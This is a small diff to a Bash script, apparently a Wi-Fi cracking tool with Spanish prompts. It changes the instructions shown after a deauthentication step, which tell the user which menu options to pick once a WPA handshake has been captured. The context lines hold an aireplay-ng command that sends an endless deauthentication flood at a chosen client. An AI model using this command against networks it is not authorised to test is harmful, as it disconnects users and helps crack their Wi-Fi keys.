@@ -195,8 +195,9 @@ macAttack(){
   echo " "
   echo "Es recomendable esperar 1 minuto para que se genere el Handshake"
   echo " "
-  echo "Cuando el minuto haya pasado, vuelva a ejecutar el programa desde otra terminal y seleccione la opción 5"
+  echo "Cuando el minuto haya pasado, escoga la opción 8 del menú principal de la misma terminal en la que se encuentra"
   echo " "
+  echo "Una vez hecho esto, por último sólo tendrá que escoger la opción 7"
   sleep 10
   aireplay-ng -0 0 -e $wifiName -c $macClient --ignore-negative-one mon0
 
